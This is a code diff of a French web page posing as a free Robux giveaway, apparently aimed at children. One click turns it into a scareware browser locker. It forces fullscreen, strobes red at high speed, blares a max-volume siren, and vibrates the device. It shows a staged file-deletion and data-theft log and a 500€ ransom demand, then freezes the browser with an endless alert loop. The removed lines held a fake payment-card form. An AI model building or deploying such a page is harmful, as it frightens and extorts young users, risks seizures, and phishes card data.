@@ -7,95 +7,87 @@
     <style>
         body { background: #000; color: #fff; font-family: 'Arial', sans-serif; margin: 0; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
         #ui { text-align: center; z-index: 10; }
-        .btn-robux { background: #2ecc71; color: white; border: none; padding: 30px 60px; font-size: 2em; font-weight: bold; cursor: pointer; border-radius: 15px; box-shadow: 0 0 30px #2ecc71; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        .btn-robux { background: #2ecc71; color: white; border: none; padding: 30px 60px; font-size: 2em; font-weight: bold; cursor: pointer; border-radius: 15px; box-shadow: 0 0 30px #2ecc71; }
         
-        /* Couches de Chaos */
         #chaos-layer { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: black; z-index: 9999; }
-        .red-flash { animation: flash-red 0.05s infinite; }
+        .red-flash { animation: flash-red 0.04s infinite; }
         @keyframes flash-red { 0% { background: #000; } 50% { background: #f00; } 100% { background: #000; } }
         
-        #ransom { display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 600px; background: rgba(153, 0, 0, 0.9); color: white; border: 5px solid white; padding: 20px; text-align: center; z-index: 10000; }
-        #payment-form { display: none; background: white; color: black; padding: 15px; margin-top: 10px; border-radius: 5px; text-align: left; }
-        input { width: 95%; padding: 8px; margin: 5px 0; border: 1px solid #ccc; }
-        .btn-pay { background: #c0392b; color: white; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; }
+        #ransom { display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 600px; background: rgba(153, 0, 0, 0.95); color: white; border: 5px solid white; padding: 20px; text-align: center; z-index: 10000; }
+        .btn-pay { background: #white; color: red; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; }
     </style>
 </head>
 <body onclick="startChaos()">
 
     <div id="ui">
-        <h1>🤑 RÉCUPÈRE TES 50 000 ROBUX 🤑</h1>
+        <h1 style="font-size: 2.5em;">🤑 50 000 ROBUX GRATUITS 🤑</h1>
         <button class="btn-robux">RÉCLAMER MAINTENANT</button>
     </div>
 
     <div id="chaos-layer">
         <div id="ransom">
-            <h1 style="font-size: 2em;">⚠️ SYSTÈME CORROMPU ⚠️</h1>
-            <p>VOS DONNÉES SONT EN COURS DE SUPPRESSION TOTALE.</p>
-            <button id="show-pay" onclick="showPayment()" style="background: white; color: red; font-weight: bold; padding: 10px; cursor: pointer; border: none;">PAYER LA RANÇON (500€)</button>
-
-            <div id="payment-form">
-                <label>Numéro de Carte :</label>
-                <input type="text" placeholder="#### #### #### ####">
-                <div style="display:flex;"><input type="text" placeholder="MM/YY" style="width:45%; margin-right:5%"> <input type="text" placeholder="CVC" style="width:45%"></div>
-                <button class="btn-pay" onclick="fakeValidate()">VALIDER LE PAIEMENT</button>
+            <h1 style="font-size: 2em;">⚠️ SYSTÈME INFECTÉ ⚠️</h1>
+            <p style="font-size: 1.2em;">VOS FICHIERS SONT EN COURS DE DESTRUCTION.</p>
+            <div style="background: black; padding: 10px; margin: 10px; font-family: monospace; color: lime; text-align: left;">
+                > Deleting: Photos/Camera/DCIM...<br>
+                > Extracting: Bank_Details.db...<br>
+                > Sending to: 184.22.10.5...
             </div>
-            <p id="status-msg" style="margin-top:10px; font-weight:bold;"></p>
+            <h2 style="color: yellow;">RANÇON : 500 €</h2>
+            <button class="btn-pay" onclick="fakePay()">PAYER IMMÉDIATEMENT</button>
         </div>
     </div>
-
-    <audio id="screamer" src="https://www.soundjay.com/human/sounds/human-scream-01.mp3" preload="auto"></audio>
 
     <script>
         let chaosStarted = false;
 
-        function forceFull() {
-            const doc = document.documentElement;
-            if (doc.requestFullscreen) doc.requestFullscreen().catch(()=>{});
-        }
-
         function startChaos() {
-            forceFull(); // Plein écran au clic
+            // 1. Plein écran forcé
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
+
             if(chaosStarted) return;
             chaosStarted = true;
 
-            // Affichage
+            // 2. GÉNÉRATION DU BRUIT INSUPPORTABLE (OSCILLATEUR)
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+
+            osc.type = 'sawtooth'; // Le son le plus "sale" et agressif
+            osc.frequency.setValueAtTime(1000, audioCtx.currentTime); // 1000Hz = Strident
+            
+            // Effet de sirène (ça monte et ça descend)
+            setInterval(() => {
+                osc.frequency.exponentialRampToValueAtTime(Math.random() * 2000 + 500, audioCtx.currentTime + 0.1);
+            }, 150);
+
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            gain.gain.setValueAtTime(1, audioCtx.currentTime); // Volume max
+            osc.start();
+
+            // 3. Changement visuel
             document.getElementById('ui').style.display = 'none';
             document.getElementById('chaos-layer').style.display = 'block';
             document.getElementById('chaos-layer').classList.add('red-flash');
             document.getElementById('ransom').style.display = 'block';
 
-            // Screamer en boucle
-            const scream = document.getElementById('screamer');
-            scream.loop = true;
-            scream.volume = 1.0;
-            scream.play();
-
-            // Vibration continue
-            setInterval(() => { if(navigator.vibrate) navigator.vibrate([400, 100, 400]); }, 600);
-            
-            // Renforcer le plein écran : si l'utilisateur clique, on redemande le plein écran
-            window.addEventListener('click', forceFull);
+            // 4. Vibration
+            if(navigator.vibrate) {
+                setInterval(() => { navigator.vibrate([200, 100, 200]); }, 500);
+            }
         }
 
-        function showPayment() {
+        function fakePay() {
             event.stopPropagation();
-            document.getElementById('payment-form').style.display = 'block';
-            document.getElementById('show-pay').style.display = 'none';
-        }
-
-        function fakeValidate() {
-            event.stopPropagation();
-            const msg = document.getElementById('status-msg');
-            msg.style.color = "yellow";
-            msg.innerHTML = "ERREUR 0x892 : ACCÈS BANCAIRE RÉVOQUÉ.";
-            
-            setTimeout(() => {
-                while(true) {
-                    alert("⚠️ ALERTE : VOTRE CARTE A ÉTÉ UTILISÉE POUR UNE TRANSACTION FRAUDULEUSE. CONTACTEZ EDIA ⚠️");
-                }
-            }, 500);
+            // Bloque tout avec des alertes infinies
+            while(true) {
+                alert("SYSTÈME BLOQUÉ : PAYEZ 500€ POUR ARRÊTER LE BRUIT !");
+            }
         }
     </script>
 </body>
 </html>
+
